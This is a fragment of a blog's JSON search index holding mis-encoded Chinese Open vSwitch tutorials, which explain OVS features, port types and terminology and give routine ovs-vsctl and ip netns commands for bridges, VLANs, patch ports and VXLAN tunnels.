style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# æ·»åŠ ä¸‰ä¸ªnetns\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns add ns0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns add ns1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns add ns2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set vnet0 netns ns0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set vnet1 netns ns1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip link set vnet2 netns ns2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# å¯åŠ¨ç«¯å£å¹¶é…ç½®IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ip link set lo up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ip link set vnet0 up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ip link set lo up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ip link set vnet1 up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns2 ip link set lo up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns2 ip link set vnet2 up\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip netns exec ns2 ip addr add 10.0.0.3/24 dev vnet2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæµ‹è¯•\u003c/p\u003e","title":"Open vSwitch å…¥é—¨å®è·µï¼ˆ2ï¼‰ä½¿ç”¨OVSæ„å»ºéš”ç¦»ç½‘ç»œ"},{"content":"OVSç®€ä»‹ Open vSwitch æ˜¯ä»€ä¹ˆï¼Ÿ Open vSwitch(ä»¥ä¸‹ç®€ç§°OVS)æ˜¯ä¸€ä¸ªç”¨Cè¯­è¨€å¼€å‘çš„å¤šå±‚è™šæ‹Ÿäº¤æ¢æœºï¼Œä½¿ç”¨Apcahe 2å¼€æºè®¸å¯è¯ï¼Œç°å¦‚ä»ŠåŸºæœ¬ä¸Šå·²ç»æˆä¸ºäº†å¼€æºSDNï¼ˆè½¯ä»¶å®šä¹‰ç½‘ç»œï¼‰åŸºç¡€è®¾æ–½å±‚çš„äº‹å®æ ‡å‡†ã€‚\nOVSæ”¯æŒå“ªäº›åŠŸèƒ½ï¼Ÿ æ”¯æŒNetFlowã€sFlow(R)ã€IPFIXã€SPANã€RSPANå’ŒGREéš§é“é•œåƒç­‰å¤šç§æµé‡ç›‘æ§åè®® æ”¯æŒLACP (IEEE 802.1AX-2008) æ”¯æŒæ ‡å‡†802.1Q VLANåè®®ï¼Œå…è®¸ç«¯å£é…ç½®trunkæ¨¡å¼ æ”¯æŒç»„æ’­ æ”¯æŒBFDå’Œ802.1agé“¾è·¯ç›‘æ§ æ”¯æŒSTPï¼ˆIEEE 802.1D-1998ï¼‰å’ŒRSTPï¼ˆIEEE 802.1D-2004ï¼‰ æ”¯æŒç»†ç²’åº¦çš„QoSï¼ˆæœåŠ¡è´¨é‡ï¼‰é…ç½® æ”¯æŒHFSC qdisc æ”¯æŒæ¥ç®¡æ¯ä¸€ä¸ªè™šæ‹Ÿæœºçš„æµé‡ æ”¯æŒåŸºäºæºMACçš„è´Ÿè½½å‡è¡¡ã€ä¸»å¤‡æ¨¡å¼å’ŒL4å“ˆå¸Œçš„ç«¯å£ç»‘å¸¦ æ”¯æŒOpenFlowåè®®ï¼ˆåŒ…å«äº†å¾ˆå¤šå¯¹è™šæ‹ŸåŒ–çš„æ‰©å±•ï¼‰ æ”¯æŒIPv6 æ”¯æŒå¤šç§éš§é“åè®®ï¼ˆGREã€VXLANã€STTã€Geneveå’ŒIPsecï¼‰ æ”¯æŒCå’ŒPythonçš„è¿œç¨‹é…ç½®åè®® æ”¯æŒå†…æ ¸å’Œç”¨æˆ·ç©ºé—´çš„è½¬å‘å¼•æ“é€‰é¡¹ å…·æœ‰æµç¼“å­˜å¼•æ“çš„å¤šè¡¨è½¬å‘ç®¡é“ è½¬å‘å±‚æŠ½è±¡ä»¥ç®€åŒ–å‘æ–°è½¯ä»¶å’Œç¡¬ä»¶å¹³å°çš„ç§»æ¤ OVSçš„æœ¯è¯­è§£é‡Š Bridge ä¸­æ–‡åç§°ç½‘æ¡¥ï¼Œä¸€ä¸ªBridgeä»£è¡¨ä¸€ä¸ªä»¥å¤ªç½‘äº¤æ¢æœºï¼ˆSwitchï¼‰ï¼Œä¸€å°ä¸»æœºä¸­å¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªBridgeï¼ŒBridgeå¯ä»¥æ ¹æ®ä¸€å®šçš„è§„åˆ™ï¼ŒæŠŠæŸä¸€ä¸ªç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡è½¬å‘åˆ°å¦ä¸€ä¸ªæˆ–å¤šä¸ªç«¯å£ä¸Šï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹æˆ–è€…ä¸¢å¼ƒæ•°æ®æŠ¥æ–‡ã€‚\nPort ä¸­æ–‡åç§°ç«¯å£ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å®ƒå’ŒTCPé‡Œé¢çš„ç«¯å£ä¸æ˜¯åŒæ ·çš„æ¦‚å¿µï¼Œå®ƒæ›´åƒæ˜¯ç‰©ç†äº¤æ¢æœºä¸Šé¢çš„æ’å£ï¼Œå¯ä»¥æ¥æ°´æ™¶å¤´çš„é‚£ç§ã€‚Portéš¶å±äºBridgeï¼Œå¿…é¡»å…ˆæ·»åŠ äº†Bridgeæ‰èƒ½åœ¨Bridgeä¸Šæ·»åŠ Portã€‚Portæœ‰ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š\nNormal\nç”¨æˆ·å¯ä»¥æŠŠæ“ä½œç³»ç»Ÿä¸­å·²æœ‰çš„ç½‘å¡æ·»åŠ åˆ°Open vSwicthä¸Šï¼ŒOpen vSwitctä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŒåçš„Portå¼€å¤„ç†è¿™å¼ ç½‘å¡è¿›å’Œå‡ºçš„æ•°æ®æŠ¥æ–‡ã€‚\nä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯è¿™ç§æ–¹å¼æ·»åŠ çš„Portä¸æ”¯æŒåˆ†é…IPåœ°å€ï¼Œå¦‚æœä¹‹å‰ç½‘å¡ä¸Šé…ç½®çš„æœ‰IPï¼ŒæŒ‚è½½åˆ°OVSä¸Šé¢ä¹‹åå°†ä¸å¯è®¿é—®ã€‚æ­¤ç±»å‹çš„Portå¸¸ç”¨äºVLANæ¨¡å¼çš„å¤šå°ç‰©ç†ä¸»æœºç›¸è¿çš„é‚£ä¸ªå£ï¼Œäº¤æ¢æœºä¸€ç«¯å±äºTrunkæ¨¡å¼ã€‚\nInternal\nå½“Portçš„ç±»å‹æ˜¯Internalæ—¶ï¼ŒOVSä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘å¡ï¼ˆInterfaceï¼‰ï¼Œæ­¤ç«¯å£æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡éƒ½ä¼šè½¬å‘ç»™è¿™å—ç½‘å¡ï¼Œä»è¿™å—ç½‘å¡å‘å‡ºçš„æ•°æ®æŠ¥æ–‡ä¹Ÿä¼šé€šè¿‡Portäº¤ç»™OVSå¤„ç†ã€‚å½“OVSåˆ›å»ºä¸€ä¸ªæ–°çš„ç½‘æ¡¥æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä¸ç½‘æ¡¥åŒåçš„Internal Portï¼ŒåŒæ—¶ä¹Ÿä¼šåˆ›å»ºä¸€ä¸ªä¸ç½‘æ¡¥åŒåçš„Interfaceï¼Œå› æ­¤å¯ä»¥é€šè¿‡ipå‘½ä»¤åœ¨æ“ä½œç³»ç»Ÿä¸­æŸ¥çœ‹åˆ°è¿™å¼ è™šæ‹Ÿç½‘å¡ï¼Œä½†æ˜¯çŠ¶æ€æ˜¯downçš„ã€‚\nPatch\nPatch Portå’Œveth pairåŠŸèƒ½ç›¸åŒï¼Œæ€»æ˜¯æˆåŒæˆå¯¹çš„å‡ºç°ï¼Œåœ¨å…¶ä¸­ä¸€ç«¯æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡ä¼šè¢«è½¬å‘åˆ°å¦ä¸€ä¸ªPatch Portä¸Šï¼Œå°±åƒæ˜¯ä¸€æ ¹ç½‘çº¿ä¸€æ ·ã€‚Patch Portå¸¸ç”¨äºè¿æ¥ä¸¤ä¸ªBridgeï¼Œè¿™æ ·ä¸¤ä¸ªç½‘æ¡¥å°±å’Œä¸€ä¸ªç½‘æ¡¥ä¸€æ ·äº†ã€‚\nTunnel\nOVS æ”¯æŒ GREã€VXLANã€STTã€Geneveå’ŒIPsecéš§é“åè®®ï¼Œè¿™äº›éš§é“åè®®å°±æ˜¯overlayç½‘ç»œçš„åŸºç¡€åè®®ï¼Œé€šè¿‡å¯¹ç‰©ç†ç½‘ç»œåšçš„ä¸€å±‚å°è£…å’Œæ‰©å±•ï¼Œè§£å†³äº†äºŒå±‚ç½‘ç»œæ•°é‡ä¸è¶³çš„é—®é¢˜ï¼Œæœ€å¤§é™åº¦çš„å‡å°‘å¯¹åº•å±‚ç‰©ç†ç½‘ç»œæ‹“æ‰‘çš„ä¾èµ–æ€§ï¼ŒåŒæ—¶ä¹Ÿæœ€å¤§é™åº¦çš„å¢åŠ äº†å¯¹ç½‘ç»œçš„æ§åˆ¶ã€‚\nInterface ï¼ˆiface/æ¥å£ï¼‰æ¥å£æ˜¯OVSä¸æ“ä½œç³»ç»Ÿäº¤æ¢æ•°æ®æŠ¥æ–‡çš„ç»„ä»¶ï¼Œä¸€ä¸ªæ¥å£å³æ˜¯æ“ä½œç³»ç»Ÿä¸Šçš„ä¸€å—ç½‘å¡ï¼Œè¿™ä¸ªç½‘å¡å¯èƒ½æ˜¯OVSç”Ÿæˆçš„è™šæ‹Ÿç½‘å¡ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æŒ‚è½½åœ¨OVSä¸Šçš„ç‰©ç†ç½‘å¡ï¼Œæ“ä½œç³»ç»Ÿä¸Šçš„è™šæ‹Ÿç½‘å¡ï¼ˆTUN/TAPï¼‰ä¹Ÿå¯ä»¥è¢«æŒ‚è½½åœ¨OVSä¸Šã€‚\nController OpenFlowæ§åˆ¶å™¨ï¼ŒOVSå¯ä»¥æ¥æ”¶ä¸€ä¸ªæˆ–è€…å¤šä¸ªOpenFlowæ§åˆ¶å™¨çš„ç®¡ç†ï¼ŒåŠŸèƒ½ä¸»è¦æ˜¯ä¸‹å‘æµè¡¨ï¼Œæ§åˆ¶è½¬å‘è§„åˆ™ã€‚\nFlow æµè¡¨æ˜¯OVSè¿›è¡Œæ•°æ®è½¬å‘çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œå®šä¹‰äº†ç«¯å£ä¹‹é—´è½¬å‘æ•°æ®æŠ¥æ–‡çš„è§„åˆ™ï¼Œä¸€æ¡æµè¡¨è§„åˆ™ä¸»è¦åˆ†ä¸ºåŒ¹é…å’ŒåŠ¨ä½œä¸¤éƒ¨åˆ†ï¼ŒåŒ¹é…éƒ¨åˆ†å†³å®šå“ªäº›æ•°æ®æŠ¥æ–‡éœ€è¦è¢«å¤„ç†ï¼ŒåŠ¨ä½œå†³å®šäº†åŒ¹é…åˆ°çš„æ•°æ®æŠ¥æ–‡è¯¥å¦‚ä½•å¤„ç†ã€‚\nOVSå¸¸ç”¨æ“ä½œ å®‰è£… yum install openvswitch systemctl enable openvswitch systemctl start openvswitch å¦‚æœå½“å‰è½¯ä»¶æºä¸­æ²¡æœ‰openvswitchï¼Œå¯ä»¥é€šè¿‡é˜¿é‡Œäº‘å®˜æ–¹é•œåƒç«™ä¸‹è½½å’Œæ“ä½œç³»ç»Ÿç‰ˆæœ¬å¯¹åº”çš„rpmåŒ…åˆ°æœ¬åœ°å†å®‰è£…ã€‚ ç¤ºä¾‹å‘½ä»¤ï¼š yum localinstall openvswitch-2.9.0-3.el7.x86_64.rpm\nBridge æ“ä½œ æ·»åŠ ç½‘æ¡¥\novs-vsctl add-br br-int æŸ¥è¯¢ç½‘æ¡¥åˆ—è¡¨\novs-vsctl list-br åˆ é™¤ç½‘æ¡¥\novs-vsctl del-br br-int Port æ“ä½œ Normal Port # å°†ç‰©ç†ç½‘å¡eth0æ·»åŠ åˆ°ç½‘æ¡¥br-intä¸Š ovs-vsctl add-port br-int eth0 # ç§»é™¤ç½‘æ¡¥br-intä¸Šçš„Port ovs-vsctl del-port br-int eth0 Internal Port # æ·»åŠ Internal Port ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal # æŠŠç½‘å¡vnet0å¯åŠ¨å¹¶é…ç½®IP ip link set vnet0 up ip addr add 192.168.0.1/24 dev vnet0 # è®¾ç½®VLAN tag ovs-vsctl set Port vnet0 tag=100 # ç§»é™¤vnet0ä¸Šé¢çš„VLAN tagé…ç½® ovs-vsctl remove Port vnet0 tag 100 # è®¾ç½®vnet0å…è®¸é€šè¿‡çš„VLAN tag ovs-vsctl set Port vnet0 trunks=100,200 # ç§»é™¤vnet0å…è®¸é€šè¿‡çš„çš„VLAN tagé…ç½® ovs-vsctl remove Port vnet0 trunks 100,200 Patch Port ovs-vsctl add-br br0 ovs-vsctl add-br br1 ovs-vsctl \\ -- add-port br0 patch0 -- set interface patch0 type=patch options:peer=patch1 \\ -- add-port br1 patch1 -- set interface patch1 type=patch options:peer=patch0 Tunnel Port #ä¸»æœº10.1.7.21ä¸Š ovs-vsctl add-br br-tun ovs-vsctl add-port br-tun vxlan-vx01 -- set Interface vxlan-vx01 type=vxlan options:remote_ip=10.1.7.22 options:key=flow ovs-vsctl add-port br-tun vxlan-vx02 -- set Interface vxlan-vx02 type=vxlan options:remote_ip=10.1.7.23 options:key=flow #ä¸»æœº10.1.7.22ä¸Š ovs-vsctl add-br br-tun ovs-vsctl add-port br-tun vxlan-vx01 -- set Interface vxlan-vx01 type=vxlan options:remote_ip=10.1.7.21 options:key=flow ovs-vsctl add-port br-tun vxlan-vx02 -- set Interface vxlan-vx02 type=vxlan options:remote_ip=10.1.7.23 options:key=flow #ä¸»æœº10.1.7.23ä¸Š ovs-vsctl add-br br-tun ovs-vsctl add-port br-tun vxlan-vx01 -- set Interface vxlan-vx01 type=vxlan options:remote_ip=10.1.7.21 options:key=flow ovs-vsctl add-port br-tun vxlan-vx02 -- set Interface vxlan-vx02 type=vxlan options:remote_ip=10.1.7.22 options:key=flow å…¶ä»–åŸºæœ¬æ“ä½œ # è®¾ç½®VLAN mode ovs-vsctl set port \u0026lt;port name\u0026gt; VLAN_mode=trunk|access|native-tagged|native-untagged # è®¾ç½®VLAN tag ovs-vsctl set port \u0026lt;port name\u0026gt; tag=\u0026lt;1-4095\u0026gt; # è®¾ç½®VLAN trunk ovs-vsctl set port \u0026lt;port name\u0026gt; trunk=100,200 # ç§»é™¤Portçš„å±æ€§ ovs-vsctl remove port \u0026lt;port name\u0026gt; \u0026lt;property name\u0026gt; \u0026lt;property value\u0026gt; # æŸ¥çœ‹Portçš„å±æ€§ ovs-vsctl list interface \u0026lt;port name\u0026gt; æ¥ä¸‹æ¥æˆ‘ä»¬å°†ä½¿ç”¨OVSæ¥å®ç°å•æœºå’Œå¤šå°ç‰©ç†æœåŠ¡å™¨ä¸‹çš„è™šæ‹ŸVLANç½‘ç»œã€‚\n","permalink":"https://www.typesafe.cn/posts/ovs-learn-1/","summary":"\u003ch1 id=\"ovsç®€ä»‹\"\u003eOVSç®€ä»‹\u003c/h1\u003e\n\u003ch3 id=\"open-vswitch-æ˜¯ä»€ä¹ˆ\"\u003eOpen vSwitch æ˜¯ä»€ä¹ˆï¼Ÿ\u003c/h3\u003e\n\u003cp\u003eOpen vSwitch(ä»¥ä¸‹ç®€ç§°OVS)æ˜¯ä¸€ä¸ªç”¨Cè¯­è¨€å¼€å‘çš„å¤šå±‚è™šæ‹Ÿäº¤æ¢æœºï¼Œä½¿ç”¨Apcahe 2å¼€æºè®¸å¯è¯ï¼Œç°å¦‚ä»ŠåŸºæœ¬ä¸Šå·²ç»æˆä¸ºäº†å¼€æºSDNï¼ˆè½¯ä»¶å®šä¹‰ç½‘ç»œï¼‰åŸºç¡€è®¾æ–½å±‚çš„äº‹å®æ ‡å‡†ã€‚\u003c/p\u003e\n\u003ch3 id=\"ovsæ”¯æŒå“ªäº›åŠŸèƒ½\"\u003eOVSæ”¯æŒå“ªäº›\u003ca href=\"http://www.openvswitch.org//features/\"\u003eåŠŸèƒ½\u003c/a\u003eï¼Ÿ\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eæ”¯æŒNetFlowã€sFlow(R)ã€IPFIXã€SPANã€RSPANå’ŒGREéš§é“é•œåƒç­‰å¤šç§æµé‡ç›‘æ§åè®®\u003c/li\u003e\n\u003cli\u003eæ”¯æŒLACP (IEEE 802.1AX-2008)\u003c/li\u003e\n\u003cli\u003eæ”¯æŒæ ‡å‡†802.1Q VLANåè®®ï¼Œå…è®¸ç«¯å£é…ç½®trunkæ¨¡å¼\u003c/li\u003e\n\u003cli\u003eæ”¯æŒç»„æ’­\u003c/li\u003e\n\u003cli\u003eæ”¯æŒBFDå’Œ802.1agé“¾è·¯ç›‘æ§\u003c/li\u003e\n\u003cli\u003eæ”¯æŒSTPï¼ˆIEEE 802.1D-1998ï¼‰å’ŒRSTPï¼ˆIEEE 802.1D-2004ï¼‰\u003c/li\u003e\n\u003cli\u003eæ”¯æŒç»†ç²’åº¦çš„QoSï¼ˆæœåŠ¡è´¨é‡ï¼‰é…ç½®\u003c/li\u003e\n\u003cli\u003eæ”¯æŒHFSC qdisc\u003c/li\u003e\n\u003cli\u003eæ”¯æŒæ¥ç®¡æ¯ä¸€ä¸ªè™šæ‹Ÿæœºçš„æµé‡\u003c/li\u003e\n\u003cli\u003eæ”¯æŒåŸºäºæºMACçš„è´Ÿè½½å‡è¡¡ã€ä¸»å¤‡æ¨¡å¼å’ŒL4å“ˆå¸Œçš„ç«¯å£ç»‘å¸¦\u003c/li\u003e\n\u003cli\u003eæ”¯æŒOpenFlowåè®®ï¼ˆåŒ…å«äº†å¾ˆå¤šå¯¹è™šæ‹ŸåŒ–çš„æ‰©å±•ï¼‰\u003c/li\u003e\n\u003cli\u003eæ”¯æŒIPv6\u003c/li\u003e\n\u003cli\u003eæ”¯æŒå¤šç§éš§é“åè®®ï¼ˆGREã€VXLANã€STTã€Geneveå’ŒIPsecï¼‰\u003c/li\u003e\n\u003cli\u003eæ”¯æŒCå’ŒPythonçš„è¿œç¨‹é…ç½®åè®®\u003c/li\u003e\n\u003cli\u003eæ”¯æŒå†…æ ¸å’Œç”¨æˆ·ç©ºé—´çš„è½¬å‘å¼•æ“é€‰é¡¹\u003c/li\u003e\n\u003cli\u003eå…·æœ‰æµç¼“å­˜å¼•æ“çš„å¤šè¡¨è½¬å‘ç®¡é“\u003c/li\u003e\n\u003cli\u003eè½¬å‘å±‚æŠ½è±¡ä»¥ç®€åŒ–å‘æ–°è½¯ä»¶å’Œç¡¬ä»¶å¹³å°çš„ç§»æ¤\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 id=\"ovsçš„æœ¯è¯­è§£é‡Š\"\u003eOVSçš„æœ¯è¯­è§£é‡Š\u003c/h1\u003e\n\u003ch3 id=\"bridge\"\u003eBridge\u003c/h3\u003e\n\u003cp\u003eä¸­æ–‡åç§°\u003cstrong\u003eç½‘æ¡¥\u003c/strong\u003eï¼Œä¸€ä¸ªBridgeä»£è¡¨ä¸€ä¸ªä»¥å¤ªç½‘äº¤æ¢æœºï¼ˆSwitchï¼‰ï¼Œä¸€å°ä¸»æœºä¸­å¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªBridgeï¼ŒBridgeå¯ä»¥æ ¹æ®ä¸€å®šçš„è§„åˆ™ï¼ŒæŠŠæŸä¸€ä¸ªç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡è½¬å‘åˆ°å¦ä¸€ä¸ªæˆ–å¤šä¸ªç«¯å£ä¸Šï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹æˆ–è€…ä¸¢å¼ƒæ•°æ®æŠ¥æ–‡ã€‚\u003c/p\u003e\n\u003ch3 id=\"port\"\u003ePort\u003c/h3\u003e\n\u003cp\u003eä¸­æ–‡åç§°\u003cstrong\u003eç«¯å£\u003c/strong\u003eï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å®ƒå’ŒTCPé‡Œé¢çš„ç«¯å£ä¸æ˜¯åŒæ ·çš„æ¦‚å¿µï¼Œå®ƒæ›´åƒæ˜¯ç‰©ç†äº¤æ¢æœºä¸Šé¢çš„æ’å£ï¼Œå¯ä»¥æ¥æ°´æ™¶å¤´çš„é‚£ç§ã€‚Portéš¶å±äºBridgeï¼Œå¿…é¡»å…ˆæ·»åŠ äº†Bridgeæ‰èƒ½åœ¨Bridgeä¸Šæ·»åŠ Portã€‚Portæœ‰ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNormal\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eç”¨æˆ·å¯ä»¥æŠŠæ“ä½œç³»ç»Ÿä¸­å·²æœ‰çš„ç½‘å¡æ·»åŠ åˆ°Open vSwicthä¸Šï¼ŒOpen vSwitctä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŒåçš„Portå¼€å¤„ç†è¿™å¼ ç½‘å¡è¿›å’Œå‡ºçš„æ•°æ®æŠ¥æ–‡ã€‚\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯è¿™ç§æ–¹å¼æ·»åŠ çš„Portä¸æ”¯æŒåˆ†é…IPåœ°å€ï¼Œå¦‚æœä¹‹å‰ç½‘å¡ä¸Šé…ç½®çš„æœ‰IPï¼ŒæŒ‚è½½åˆ°OVSä¸Šé¢ä¹‹åå°†ä¸å¯è®¿é—®ã€‚æ­¤ç±»å‹çš„Portå¸¸ç”¨äºVLANæ¨¡å¼çš„å¤šå°ç‰©ç†ä¸»æœºç›¸è¿çš„é‚£ä¸ªå£ï¼Œäº¤æ¢æœºä¸€ç«¯å±äºTrunkæ¨¡å¼ã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInternal\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eå½“Portçš„ç±»å‹æ˜¯Internalæ—¶ï¼ŒOVSä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘å¡ï¼ˆInterfaceï¼‰ï¼Œæ­¤ç«¯å£æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡éƒ½ä¼šè½¬å‘ç»™è¿™å—ç½‘å¡ï¼Œä»è¿™å—ç½‘å¡å‘å‡ºçš„æ•°æ®æŠ¥æ–‡ä¹Ÿä¼šé€šè¿‡Portäº¤ç»™OVSå¤„ç†ã€‚å½“OVSåˆ›å»ºä¸€ä¸ªæ–°çš„ç½‘æ¡¥æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä¸ç½‘æ¡¥åŒåçš„Internal Portï¼ŒåŒæ—¶ä¹Ÿä¼šåˆ›å»ºä¸€ä¸ªä¸ç½‘æ¡¥åŒåçš„Interfaceï¼Œå› æ­¤å¯ä»¥é€šè¿‡ipå‘½ä»¤åœ¨æ“ä½œç³»ç»Ÿä¸­æŸ¥çœ‹åˆ°è¿™å¼ è™šæ‹Ÿç½‘å¡ï¼Œä½†æ˜¯çŠ¶æ€æ˜¯downçš„ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003ePatch\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003ePatch Portå’Œveth pairåŠŸèƒ½ç›¸åŒï¼Œæ€»æ˜¯æˆåŒæˆå¯¹çš„å‡ºç°ï¼Œåœ¨å…¶ä¸­ä¸€ç«¯æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡ä¼šè¢«è½¬å‘åˆ°å¦ä¸€ä¸ªPatch Portä¸Šï¼Œå°±åƒæ˜¯ä¸€æ ¹ç½‘çº¿ä¸€æ ·ã€‚Patch Portå¸¸ç”¨äºè¿æ¥ä¸¤ä¸ªBridgeï¼Œè¿™æ ·ä¸¤ä¸ªç½‘æ¡¥å°±å’Œä¸€ä¸ªç½‘æ¡¥ä¸€æ ·äº†ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTunnel\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eOVS æ”¯æŒ GREã€VXLANã€STTã€Geneveå’ŒIPsecéš§é“åè®®ï¼Œè¿™äº›éš§é“åè®®å°±æ˜¯overlayç½‘ç»œçš„åŸºç¡€åè®®ï¼Œé€šè¿‡å¯¹ç‰©ç†ç½‘ç»œåšçš„ä¸€å±‚å°è£…å’Œæ‰©å±•ï¼Œè§£å†³äº†äºŒå±‚ç½‘ç»œæ•°é‡ä¸è¶³çš„é—®é¢˜ï¼Œæœ€å¤§é™åº¦çš„å‡å°‘å¯¹åº•å±‚ç‰©ç†ç½‘ç»œæ‹“æ‰‘çš„ä¾èµ–æ€§ï¼ŒåŒæ—¶ä¹Ÿæœ€å¤§é™åº¦çš„å¢åŠ äº†å¯¹ç½‘ç»œçš„æ§åˆ¶ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"interface\"\u003eInterface\u003c/h3\u003e\n\u003cp\u003eï¼ˆiface/æ¥å£ï¼‰æ¥å£æ˜¯OVSä¸æ“ä½œç³»ç»Ÿäº¤æ¢æ•°æ®æŠ¥æ–‡çš„ç»„ä»¶ï¼Œä¸€ä¸ªæ¥å£å³æ˜¯æ“ä½œç³»ç»Ÿä¸Šçš„ä¸€å—ç½‘å¡ï¼Œè¿™ä¸ªç½‘å¡å¯èƒ½æ˜¯OVSç”Ÿæˆçš„è™šæ‹Ÿç½‘å¡ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æŒ‚è½½åœ¨OVSä¸Šçš„ç‰©ç†ç½‘å¡ï¼Œæ“ä½œç³»ç»Ÿä¸Šçš„è™šæ‹Ÿç½‘å¡ï¼ˆTUN/TAPï¼‰ä¹Ÿå¯ä»¥è¢«æŒ‚è½½åœ¨OVSä¸Šã€‚\u003c/p\u003e\n\u003ch3 id=\"controller\"\u003eController\u003c/h3\u003e\n\u003cp\u003eOpenFlowæ§åˆ¶å™¨ï¼ŒOVSå¯ä»¥æ¥æ”¶ä¸€ä¸ªæˆ–è€…å¤šä¸ªOpenFlowæ§åˆ¶å™¨çš„ç®¡ç†ï¼ŒåŠŸèƒ½ä¸»è¦æ˜¯ä¸‹å‘æµè¡¨ï¼Œæ§åˆ¶è½¬å‘è§„åˆ™ã€‚\u003c/p\u003e\n\u003ch3 id=\"flow\"\u003eFlow\u003c/h3\u003e\n\u003cp\u003eæµè¡¨æ˜¯OVSè¿›è¡Œæ•°æ®è½¬å‘çš„æ 